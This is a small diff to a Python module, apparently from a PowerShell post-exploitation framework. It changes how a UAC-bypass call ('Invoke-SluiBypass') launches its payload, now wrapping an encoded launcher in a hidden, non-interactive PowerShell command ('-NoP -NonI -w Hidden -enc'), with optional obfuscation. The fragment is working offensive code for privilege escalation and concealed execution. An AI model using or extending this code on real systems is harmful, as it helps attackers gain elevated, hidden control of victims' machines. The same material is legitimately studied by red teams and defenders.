@@ -108,7 +108,7 @@ class Module:
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
             else:
-                scriptEnd = "Invoke-SluiBypass -command \"%s\"" % (encScript)
+                scriptEnd = "Invoke-SluiBypass -command \"powershell -NoP -NonI -w Hidden -enc %s\"" % (encScript)
                 if obfuscate:
                     scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
                 script += scriptEnd
